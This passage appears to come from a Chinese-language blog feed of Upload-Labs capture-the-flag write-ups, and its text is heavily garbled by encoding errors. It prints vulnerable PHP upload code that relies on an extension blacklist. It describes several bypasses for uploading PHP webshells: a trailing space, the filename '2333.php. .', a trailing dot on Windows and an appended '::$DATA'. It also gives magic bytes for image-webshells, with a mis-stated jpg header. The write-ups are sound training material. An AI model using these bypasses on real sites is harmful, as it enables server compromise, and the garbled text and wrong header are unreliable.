&lt;p&gt;â€‹ å› ä¸ºæ˜¯æ‹¼æ¥çš„ï¼Œæ‰€ä»¥è¦ç›´æ¥æ‘¸åˆ°å›¾ç‰‡æœ€åº•éƒ¨æŸ¥çœ‹æˆåŠŸã€‚å®Œå·¥&lt;/p&gt;
&lt;h2 id="pass-15"&gt;Pass-15
&lt;/h2&gt;&lt;p&gt;â€‹ ï¼ˆLinuxç¯å¢ƒï¼‰&lt;/p&gt;
&lt;p&gt;â€‹ 13ã€14ã€15é¢˜éƒ½æ˜¯å¯¹&lt;strong&gt;æ–‡ä»¶çš„å¤´æ ‡è¯†&lt;/strong&gt;è¿›è¡Œäº†æ£€æµ‹ï¼Œåªä¸è¿‡ç¬¬åå››å…³ä½¿ç”¨çš„æ˜¯getimagesizeå‡½æ•°ï¼Œç¬¬åäº”å…³ä½¿ç”¨çš„æ˜¯exif_imagetypeå‡½æ•°,å‡½æ•°è¿”å›å€¼å†…å®¹ä¸ä¸€æ ·è€Œå·²ã€‚ä½¿ç”¨&lt;code&gt;copy /b&lt;/code&gt;åˆ¶ä½œçš„å›¾ç‰‡é©¬å¯ä»¥ç›´æ¥é€šè¿‡ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ ç½‘ä¸Šæœé›†è¿‡æ¥çš„èµ„æ–™&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;png æ–‡ä»¶å¤´ 89504E470D0A1A0A&lt;/p&gt;
&lt;p&gt;jpg æ–‡ä»¶å¤´ 89504E470D0A1A0A&lt;/p&gt;
&lt;p&gt;gif æ–‡ä»¶å¤´ 474946383961&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;â€‹ è¿™å‡ ä¸ªå­—èŠ‚åº”è¯¥éƒ½æ˜¯å¤Ÿé•¿çš„å¯ä»¥ç»•è¿‡è¿™ä¸‰ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥éªŒè¯äº†åŒå­¦è¯´çš„ä¸åŒçš„å‡½æ•°æ£€æµ‹çš„æ–‡ä»¶å¤´é•¿åº¦æ˜¯ä¸ä¸€æ ·çš„ã€‚å®Œå·¥&lt;/p&gt;</description></item><item><title>Upload-Labs(äºŒ)</title><link>/posts/ctf/upload-labs2/</link><pubDate>Mon, 09 Nov 2020 20:12:27 +0000</pubDate><guid>/posts/ctf/upload-labs2/</guid><description>&lt;h2 id="å‰è¨€"&gt;å‰è¨€
&lt;/h2&gt;&lt;p&gt;â€‹ è¿™æ¬¡å½»åº•çš„ä»å¤´åˆ°å°¾åˆ†æäº†ä¸€ä¸‹æºç çš„æ‰§è¡Œè¿‡ç¨‹ï¼Œå¤§è‡´çš„å†™ä¸€ä¸‹ï¼Œä»¥é˜²ä»¥åå†çœ‹çš„æ—¶å€™ä¸çŸ¥é“é¢˜ç›®æ˜¯ä»€ä¹ˆæƒ…å†µã€‚&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;$is_upload = false;
$msg = null;
if (isset($_POST[&amp;#39;submit&amp;#39;])) {
if (file_exists(UPLOAD_PATH)) {
//è¿™é‡Œä¸‹é¢æ˜¯è¿‡æ»¤
$deny_ext = array(&amp;#34;.php&amp;#34;,&amp;#34;.php5&amp;#34;,&amp;#34;.php4&amp;#34;,&amp;#34;.html&amp;#34;, ......);
$file_name = trim($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]);
$file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
$file_ext = strrchr($file_name, &amp;#39;.&amp;#39;);
$file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™
$file_ext = str_ireplace(&amp;#39;::$DATA&amp;#39;, &amp;#39;&amp;#39;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA
$file_ext = trim($file_ext); //é¦–å°¾å»ç©º
//è¿™é‡Œä¸‹é¢æ˜¯ç§»åŠ¨æ–‡ä»¶ã€‚
if (!in_array($file_ext, $deny_ext)) {
$temp_file = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
$img_path = UPLOAD_PATH.&amp;#39;/&amp;#39;.$file_name;
if (move_uploaded_file($temp_file, $img_path)) {
$is_upload = true;
} else {
$msg = &amp;#39;ä¸Šä¼ å‡ºé”™ï¼&amp;#39;;
}
} else {
$msg = &amp;#39;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&amp;#39;;
}
} else {
$msg = UPLOAD_PATH . &amp;#39;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&amp;#39;;
}
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è¿‡æ»¤éƒ¨åˆ†ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;$deny_ext&lt;/code&gt;æ˜¯ä¸€ä¸ªè¿‡æ»¤çš„åç¼€æ•°ç»„ï¼Œåªè¦æ˜¯åœ¨é‡Œé¢çš„åç¼€éƒ½æ˜¯è¢«ç¦æ­¢ä¸Šä¼ çš„ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;$file_name = trim($FILES['upload_file']['name'])&lt;/code&gt;è¿™æ®µä»£ç æœ‰ä¸¤ä¸ªç‚¹éœ€è¦è¯´ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;$FILES['upload_file']['name']&lt;/code&gt;æ˜¯è·å–ä¸Šä¼ æ–‡ä»¶çš„åç§°ï¼ŒPHPä¸­$FILESæ˜¯ä¸€ä¸ªé¢„å®šä¹‰çš„æ•°ç»„ï¼Œç”¨æ¥è·å–é€šè¿‡ POST æ–¹æ³•ä¸Šä¼ æ–‡ä»¶çš„ç›¸å…³ä¿¡æ¯ã€‚å¦‚æœä¸ºå•ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œé‚£ä¹ˆ $FILES ä¸ºäºŒç»´æ•°ç»„ï¼›å¦‚æœä¸ºå¤šä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œé‚£ä¹ˆ $FILES ä¸ºä¸‰ç»´æ•°ç»„ã€‚è´´ä¸€ä¸ªå‚è€ƒçš„åšå®¢ï¼š&lt;a class="link" href="https://www.cnblogs.com/laijinquan/p/8682282.html" target="_blank" rel="noopener"
&gt;PHP $_FILESå‡½æ•°è¯¦è§£&lt;/a&gt;ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;trim()&lt;/code&gt;å‡½æ•°çš„ä½œç”¨å°±æ˜¯å»é™¤æ–‡ä»¶åç§°å‰åçš„ç©ºæ ¼æ¢è¡Œç¬¦ç­‰ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;$file_name = deldot($file_name)&lt;/code&gt;è¿™ä¸ªæ³¨é‡Šä¸­å¾ˆæ¸…æ¥šï¼Œæ˜¯åˆ é™¤æ–‡ç« æœ«å°¾çš„ç‚¹ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;$file_ext = strrchr($file_name, '.')&lt;/code&gt;ä¸­&lt;code&gt;strrchr(string s1,char c1)&lt;/code&gt;å‡½æ•°æŸ¥æ‰¾å­—ç¬¦æˆ–å­—ç¬¦ä¸²c1åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²s1ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¹¶è¿”å›ä»è¯¥ä½ç½®åˆ°å­—ç¬¦ä¸²ç»“å°¾çš„æ‰€æœ‰å­—ç¬¦ã€‚è¯´ç™½äº†å°±æ˜¯è·å–æ–‡ä»¶çš„åç¼€åã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;$file_ext = strtolower($file_ext)&lt;/code&gt;æ³¨é‡Šä¸Šè½¬æ¢å°å†™ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;$file_ext = str_ireplace('::$DATA', '', $file_ext)&lt;/code&gt;å»é™¤å­—ç¬¦ä¸²::$DATAã€‚ç¬¬å…«é¢˜è®²äº†åŸç†&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä¸Šä¼ éƒ¨åˆ†ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;in_array($file_ext, $deny_ext)&lt;/code&gt;åˆ¤æ–­æ–‡ä»¶çš„åç¼€(ç¬¬ä¸€ä¸ªå‚æ•°)æ˜¯ä¸æ˜¯åœ¨é»‘åå•æ•°ç»„(ç¬¬äºŒä¸ªå‚æ•°)ä¸­ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$_FILES['upload_file']['tmp_name']&lt;/code&gt;æ–‡ä»¶è¢«ä¸Šä¼ ååœ¨æœåŠ¡ç«¯å‚¨å­˜çš„ä¸´æ—¶æ–‡ä»¶åï¼Œä¸€èˆ¬æ˜¯ç³»ç»Ÿé»˜è®¤ã€‚å¯ä»¥åœ¨php.iniçš„upload_tmp_dir æŒ‡å®šã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$img_path = UPLOAD_PATH.'/'.$file_name&lt;/code&gt;è¿™ä¸ªå˜é‡æ˜¯è®¾ç½®éœ€è¦ä¿å­˜åˆ°çš„è·¯å¾„&lt;/li&gt;
&lt;li&gt;&lt;code&gt;move_uploaded_file($temp_file, $img_path)&lt;/code&gt;æœ¬å‡½æ•°æ£€æŸ¥å¹¶ç¡®ä¿æŒ‡å®šçš„æ–‡ä»¶(ç¬¬ä¸€ä¸ªå‚æ•°)æ˜¯åˆæ³•çš„ä¸Šä¼ æ–‡ä»¶(å³é€šè¿‡ PHP çš„ HTTP POST ä¸Šä¼ æœºåˆ¶æ‰€ä¸Šä¼ çš„)ã€‚å¦‚æœæ–‡ä»¶åˆæ³•ï¼Œåˆ™å°†å…¶ç§»åŠ¨ä¸ºç”±æŒ‡å®šçš„æ–‡ä»¶è·¯å¾„(ç¬¬äºŒä¸ªå‚æ•°)ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="pass-06"&gt;Pass-06
&lt;/h2&gt;&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;$is_upload = false;
$msg = null;
if (isset($_POST[&amp;#39;submit&amp;#39;])) {
if (file_exists(UPLOAD_PATH)) {
$deny_ext = array(&amp;#34;.php&amp;#34;,&amp;#34;.php5&amp;#34;,&amp;#34;.php4&amp;#34;,&amp;#34;.php3&amp;#34;,&amp;#34;.php2&amp;#34;,&amp;#34;.html&amp;#34;,&amp;#34;.htm&amp;#34;,&amp;#34;.phtml&amp;#34;,&amp;#34;.pht&amp;#34;,&amp;#34;.pHp&amp;#34;,&amp;#34;.pHp5&amp;#34;,&amp;#34;.pHp4&amp;#34;,&amp;#34;.pHp3&amp;#34;,&amp;#34;.pHp2&amp;#34;,&amp;#34;.Html&amp;#34;,&amp;#34;.Htm&amp;#34;,&amp;#34;.pHtml&amp;#34;,&amp;#34;.jsp&amp;#34;,&amp;#34;.jspa&amp;#34;,&amp;#34;.jspx&amp;#34;,&amp;#34;.jsw&amp;#34;,&amp;#34;.jsv&amp;#34;,&amp;#34;.jspf&amp;#34;,&amp;#34;.jtml&amp;#34;,&amp;#34;.jSp&amp;#34;,&amp;#34;.jSpx&amp;#34;,&amp;#34;.jSpa&amp;#34;,&amp;#34;.jSw&amp;#34;,&amp;#34;.jSv&amp;#34;,&amp;#34;.jSpf&amp;#34;,&amp;#34;.jHtml&amp;#34;,&amp;#34;.asp&amp;#34;,&amp;#34;.aspx&amp;#34;,&amp;#34;.asa&amp;#34;,&amp;#34;.asax&amp;#34;,&amp;#34;.ascx&amp;#34;,&amp;#34;.ashx&amp;#34;,&amp;#34;.asmx&amp;#34;,&amp;#34;.cer&amp;#34;,&amp;#34;.aSp&amp;#34;,&amp;#34;.aSpx&amp;#34;,&amp;#34;.aSa&amp;#34;,&amp;#34;.aSax&amp;#34;,&amp;#34;.aScx&amp;#34;,&amp;#34;.aShx&amp;#34;,&amp;#34;.aSmx&amp;#34;,&amp;#34;.cEr&amp;#34;,&amp;#34;.sWf&amp;#34;,&amp;#34;.swf&amp;#34;,&amp;#34;.htaccess&amp;#34;);
$file_name = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;];
$file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
$file_ext = strrchr($file_name, &amp;#39;.&amp;#39;);
$file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™
$file_ext = str_ireplace(&amp;#39;::$DATA&amp;#39;, &amp;#39;&amp;#39;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA
if (!in_array($file_ext, $deny_ext)) {
$temp_file = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
$img_path = UPLOAD_PATH.&amp;#39;/&amp;#39;.date(&amp;#34;YmdHis&amp;#34;).rand(1000,9999).$file_ext;
if (move_uploaded_file($temp_file,$img_path)) {
$is_upload = true;
} else {
$msg = &amp;#39;ä¸Šä¼ å‡ºé”™ï¼&amp;#39;;
}
} else {
$msg = &amp;#39;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &amp;#39;;
}
} else {
$msg = UPLOAD_PATH . &amp;#39;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&amp;#39;;
}
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;â€‹ çœ‹æºç å‘ç°å°‘äº†&lt;code&gt;trim()&lt;/code&gt;å‡½æ•°&lt;strong&gt;å¯¹æ–‡ä»¶åå‰åçš„ç©ºæ ¼å¤„ç†&lt;/strong&gt;ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨ä¸Šä¼ æ–‡ä»¶æ—¶åœ¨åç¼€ååé¢æ·»åŠ ç©ºæ ¼ä½¿å…¶æˆä¸º.php (æœ‰ç©ºæ ¼)ç»•è¿‡é»‘åå•æ•°ç»„ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/09/Bb9jQe.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;â€‹ ä¸Šä¼ ä»¥åè®¿é—®æ–‡ä»¶æ‰§è¡ŒæˆåŠŸã€‚å®Œå·¥&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/09/Bb9xLd.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;â€‹ è¿™é‡Œè¯´æ˜ä¸€ä¸‹ï¼Œæˆ‘å‰é¢æ˜¯åœ¨&lt;a class="link" href="https://buuoj.cn/" target="_blank" rel="noopener"
&gt;BUUCTF&lt;/a&gt;åœ¨çº¿é¶åœºä¸Šåšçš„linuxç¯å¢ƒä¸‹çš„é¢˜ç›®ï¼Œä½†æ˜¯è¿™é“é¢˜ç”¨äº†ä¸Šé¢çš„æ–¹æ³•æ€ä¹ˆéƒ½è®¿é—®ä¸åˆ°ï¼Œæ‰€ä»¥æˆ‘åœ¨æœ¬åœ°windowsç¯å¢ƒä¸Šæ­å»ºäº†ä¸€ä¸ªé¶æœºè¿›è¡Œä¸Šä¼ (è€Œä¸”åé¢æœ‰é“é¢˜å¿…é¡»æ˜¯åœ¨windowsç¯å¢ƒä¸‹æ‰å¯ä»¥é€šè¿‡)ã€‚åœ¨githubä¸Šä¸‹è½½çš„æºç é¢˜ç›®æ¯”åœ¨çº¿é¶åœºä¸Šçš„é¢˜ç›®å¤šäº†ä¸€é“ï¼Œå¯¹åº”çš„é¢˜ç›®ä¸º åœ¨çº¿é¶æœºpass-06&amp;ndash;&amp;gt;githubä¸‹è½½çš„pass-07ã€‚é»˜è®¤ä½¿ç”¨çš„éƒ½æ˜¯linuxç¯å¢ƒä¸‹çš„é¢˜ç›®ï¼Œæœ‰æ”¹å˜ä¼šæå‰è¯´æ˜ã€‚&lt;/p&gt;
&lt;p&gt;â€‹&lt;/p&gt;
&lt;h2 id="pass-07"&gt;Pass-07
&lt;/h2&gt;&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;$is_upload = false;
$msg = null;
if (isset($_POST[&amp;#39;submit&amp;#39;])) {
if (file_exists(UPLOAD_PATH)) {
$deny_ext = array(&amp;#34;.php&amp;#34;,&amp;#34;.php5&amp;#34;,&amp;#34;.php4&amp;#34;,&amp;#34;.php3&amp;#34;,&amp;#34;.php2&amp;#34;,&amp;#34;.html&amp;#34;,&amp;#34;.htm&amp;#34;,&amp;#34;.phtml&amp;#34;,&amp;#34;.pht&amp;#34;,&amp;#34;.pHp&amp;#34;,&amp;#34;.pHp5&amp;#34;,&amp;#34;.pHp4&amp;#34;,&amp;#34;.pHp3&amp;#34;,&amp;#34;.pHp2&amp;#34;,&amp;#34;.Html&amp;#34;,&amp;#34;.Htm&amp;#34;,&amp;#34;.pHtml&amp;#34;,&amp;#34;.jsp&amp;#34;,&amp;#34;.jspa&amp;#34;,&amp;#34;.jspx&amp;#34;,&amp;#34;.jsw&amp;#34;,&amp;#34;.jsv&amp;#34;,&amp;#34;.jspf&amp;#34;,&amp;#34;.jtml&amp;#34;,&amp;#34;.jSp&amp;#34;,&amp;#34;.jSpx&amp;#34;,&amp;#34;.jSpa&amp;#34;,&amp;#34;.jSw&amp;#34;,&amp;#34;.jSv&amp;#34;,&amp;#34;.jSpf&amp;#34;,&amp;#34;.jHtml&amp;#34;,&amp;#34;.asp&amp;#34;,&amp;#34;.aspx&amp;#34;,&amp;#34;.asa&amp;#34;,&amp;#34;.asax&amp;#34;,&amp;#34;.ascx&amp;#34;,&amp;#34;.ashx&amp;#34;,&amp;#34;.asmx&amp;#34;,&amp;#34;.cer&amp;#34;,&amp;#34;.aSp&amp;#34;,&amp;#34;.aSpx&amp;#34;,&amp;#34;.aSa&amp;#34;,&amp;#34;.aSax&amp;#34;,&amp;#34;.aScx&amp;#34;,&amp;#34;.aShx&amp;#34;,&amp;#34;.aSmx&amp;#34;,&amp;#34;.cEr&amp;#34;,&amp;#34;.sWf&amp;#34;,&amp;#34;.swf&amp;#34;,&amp;#34;.htaccess&amp;#34;);
$file_name = trim($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]);
$file_ext = strrchr($file_name, &amp;#39;.&amp;#39;);
$file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™
$file_ext = str_ireplace(&amp;#39;::$DATA&amp;#39;, &amp;#39;&amp;#39;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA
$file_ext = trim($file_ext); //é¦–å°¾å»ç©º
if (!in_array($file_ext, $deny_ext)) {
$temp_file = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
$img_path = UPLOAD_PATH.&amp;#39;/&amp;#39;.$file_name;
if (move_uploaded_file($temp_file, $img_path)) {
$is_upload = true;
} else {
$msg = &amp;#39;ä¸Šä¼ å‡ºé”™ï¼&amp;#39;;
}
} else {
$msg = &amp;#39;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&amp;#39;;
}
} else {
$msg = UPLOAD_PATH . &amp;#39;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&amp;#39;;
}
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;â€‹ è¿™é“é¢˜å°‘äº†&lt;strong&gt;åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹&lt;/strong&gt;ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ &lt;strong&gt;2333.php. .&lt;/strong&gt;(æœ«å°¾åŠ  ç‚¹ ç©ºæ ¼ ç‚¹)ï¼Œè¢«è§£æåæ–‡ä»¶åç¼€å°±ä¼šæˆä¸º&amp;quot;. &amp;ldquo;(ä¸€ä¸ªç‚¹ä¸€ä¸ªç©ºæ ¼)ï¼Œå¯ä»¥ç»•è¿‡é»‘åå•ï¼Œè®¿é—®çš„æ–‡ä»¶åæ˜¯&lt;code&gt;2333.php. .&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/09/BbCOkq.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;â€‹ æˆ‘åˆå‚è€ƒäº†å…¶ä»–åšå®¢ï¼Œè®²åˆ°windowsç¯å¢ƒä¸‹å¯ä»¥åˆ©ç”¨ç³»ç»Ÿä¼šè‡ªåŠ¨åˆ é™¤åç¼€ä¸­æœ€åçš„ä¸€ä¸ª&amp;rdquo;.&amp;quot;ï¼Œå°è¯•åœ¨windowsé¶æœºä¸Šæµ‹è¯•&lt;strong&gt;åªæ·»åŠ ä¸€ä¸ªç‚¹&lt;/strong&gt;ï¼Œè®¿é—®çš„æ–‡ä»¶åä¸º&lt;code&gt;2333.phpã€2333.php.&lt;/code&gt;éƒ½å¯ä»¥ï¼Œå› ä¸ºwindowsä¼šåˆ é™¤æœ€åä¸€ä¸ªç‚¹ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/09/BbMywV.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/09/BbKXq0.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;â€‹ ä¸¤ç§æ–¹å¼ç¬¬ä¸€ä¸ªåœ¨linuxç¯å¢ƒä¸‹çš„phpæœåŠ¡å™¨ä¸Šï¼Œç¬¬äºŒä¸ªåœ¨windowsç¯å¢ƒä¸‹çš„phpæœåŠ¡å™¨ä¸Šï¼Œä¸Šä¼ åéƒ½å¯ä»¥æˆåŠŸè®¿é—®æ–‡ä»¶ã€‚å®Œå·¥&lt;/p&gt;
&lt;h2 id="pass-08"&gt;Pass-08
&lt;/h2&gt;&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;$is_upload = false;
$msg = null;
if (isset($_POST[&amp;#39;submit&amp;#39;])) {
if (file_exists(UPLOAD_PATH)) {
$deny_ext = array(&amp;#34;.php&amp;#34;,&amp;#34;.php5&amp;#34;,&amp;#34;.php4&amp;#34;,&amp;#34;.php3&amp;#34;,&amp;#34;.php2&amp;#34;,&amp;#34;.html&amp;#34;,&amp;#34;.htm&amp;#34;,&amp;#34;.phtml&amp;#34;,&amp;#34;.pht&amp;#34;,&amp;#34;.pHp&amp;#34;,&amp;#34;.pHp5&amp;#34;,&amp;#34;.pHp4&amp;#34;,&amp;#34;.pHp3&amp;#34;,&amp;#34;.pHp2&amp;#34;,&amp;#34;.Html&amp;#34;,&amp;#34;.Htm&amp;#34;,&amp;#34;.pHtml&amp;#34;,&amp;#34;.jsp&amp;#34;,&amp;#34;.jspa&amp;#34;,&amp;#34;.jspx&amp;#34;,&amp;#34;.jsw&amp;#34;,&amp;#34;.jsv&amp;#34;,&amp;#34;.jspf&amp;#34;,&amp;#34;.jtml&amp;#34;,&amp;#34;.jSp&amp;#34;,&amp;#34;.jSpx&amp;#34;,&amp;#34;.jSpa&amp;#34;,&amp;#34;.jSw&amp;#34;,&amp;#34;.jSv&amp;#34;,&amp;#34;.jSpf&amp;#34;,&amp;#34;.jHtml&amp;#34;,&amp;#34;.asp&amp;#34;,&amp;#34;.aspx&amp;#34;,&amp;#34;.asa&amp;#34;,&amp;#34;.asax&amp;#34;,&amp;#34;.ascx&amp;#34;,&amp;#34;.ashx&amp;#34;,&amp;#34;.asmx&amp;#34;,&amp;#34;.cer&amp;#34;,&amp;#34;.aSp&amp;#34;,&amp;#34;.aSpx&amp;#34;,&amp;#34;.aSa&amp;#34;,&amp;#34;.aSax&amp;#34;,&amp;#34;.aScx&amp;#34;,&amp;#34;.aShx&amp;#34;,&amp;#34;.aSmx&amp;#34;,&amp;#34;.cEr&amp;#34;,&amp;#34;.sWf&amp;#34;,&amp;#34;.swf&amp;#34;,&amp;#34;.htaccess&amp;#34;,&amp;#34;.ini&amp;#34;);
$file_name = trim($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]);
$file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
$file_ext = strrchr($file_name, &amp;#39;.&amp;#39;);
$file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™
$file_ext = trim($file_ext); //é¦–å°¾å»ç©º
if (!in_array($file_ext, $deny_ext)) {
$temp_file = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;];
$img_path = UPLOAD_PATH.&amp;#39;/&amp;#39;.date(&amp;#34;YmdHis&amp;#34;).rand(1000,9999).$file_ext;
if (move_uploaded_file($temp_file, $img_path)) {
$is_upload = true;
} else {
$msg = &amp;#39;ä¸Šä¼ å‡ºé”™ï¼&amp;#39;;
}
} else {
$msg = &amp;#39;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&amp;#39;;
}
} else {
$msg = UPLOAD_PATH . &amp;#39;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&amp;#39;;
}
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;â€‹ å®¡æŸ¥ä»£ç å‘ç°å°‘äº†å¯¹&lt;code&gt;::$DATA&lt;/code&gt;å­—ç¬¦ä¸²çš„å¤„ç†ï¼Œè¿™é‡Œå°±è¦ç”¨åˆ°å‰é¢æåˆ°çš„windowsç¯å¢ƒäº†ï¼Œè´´ä¸€ä¸‹åŸç†ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;phpåœ¨windowçš„æ—¶å€™å¦‚æœæ–‡ä»¶å+&amp;quot;::$DATA&amp;quot;ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€å.ä¸”ä¿æŒ&amp;quot;::$DATA&amp;quot;ä¹‹å‰çš„æ–‡ä»¶å&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;â€‹ ç›´æ¥ä¸Šä¼ çš„æ—¶å€™æŠ“åŒ…åœ¨æ–‡ä»¶ååé¢æ·»åŠ &lt;code&gt;::$DATA&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://s1.ax1x.com/2020/11/09/BbP84P.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;â€‹ ä¸Šä¼ è®¿é—®ã€‚å®Œå·¥&lt;/p&gt;
&lt;h2 id="pass-09"&gt;Pass-09
&lt;/h2&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;$is_upload = false;
$msg = null;
if (isset($_POST[&amp;#39;submit&amp;#39;])) {
if (file_exists(UPLOAD_PATH)) {
$deny_ext = array(&amp;#34;.php&amp;#34;,&amp;#34;.php5&amp;#34;,&amp;#34;.php4&amp;#34;,&amp;#34;.php3&amp;#34;,&amp;#34;.php2&amp;#34;,&amp;#34;.html&amp;#34;,&amp;#34;.htm&amp;#34;,&amp;#34;.phtml&amp;#34;,&amp;#34;.pht&amp;#34;,&amp;#34;.pHp&amp;#34;,&amp;#34;.pHp5&amp;#34;,&amp;#34;.pHp4&amp;#34;,&amp;#34;.pHp3&amp;#34;,&amp;#34;.pHp2&amp;#34;,&amp;#34;.Html&amp;#34;,&amp;#34;.Htm&amp;#34;,&amp;#34;.pHtml&amp;#34;,&amp;#34;.jsp&amp;#34;,&amp;#34;.jspa&amp;#34;,&amp;#34;.jspx&amp;#34;,&amp;#34;.jsw&amp;#34;,&amp;#34;.jsv&amp;#34;,&amp;#34;.jspf&amp;#34;,&amp;#34;.jtml&amp;#34;,&amp;#34;.jSp&amp;#34;,&amp;#34;.jSpx&amp;#34;,&amp;#34;.jSpa&amp;#34;,&amp;#34;.jSw&amp;#34;,&amp;#34;.jSv&amp;#34;,&amp;#34;.jSpf&amp;#34;,&amp;#34;.jHtml&amp;#34;,&amp;#34;.asp&amp;#34;,&amp;#34;.aspx&amp;#34;,&amp;#34;.asa&amp;#34;,&amp;#34;.asax&amp;#34;,&amp;#34;.ascx&amp;#34;,&amp;#34;.ashx&amp;#34;,&amp;#34;.asmx&amp;#34;,&amp;#34;.cer&amp;#34;,&amp;#34;.aSp&amp;#34;,&amp;#34;.aSpx&amp;#34;,&amp;#34;.aSa&amp;#34;,&amp;#34;.aSax&amp;#34;,&amp;#34;.aScx&amp;#34;,&amp;#34;.aShx&amp;#34;,&amp;#34;.aSmx&amp;#34;,&amp;#34;.cEr&amp;#34;,&amp;#34;.sWf&amp;#34;,&amp;#34;.swf&amp;#34;,&amp;#34;.htaccess&amp;#34;);
$file_name = trim($_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]);
$file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
$file_ext = strrchr($file_name, &amp;#39;.&amp;#39;);
$file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™
$file_ext = str_ireplace(&amp;#39;::$DATA&amp;#39;, &amp;#39;&amp;#39;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA
$file_ext = trim($file_ext); //é¦–å°¾å»ç©º
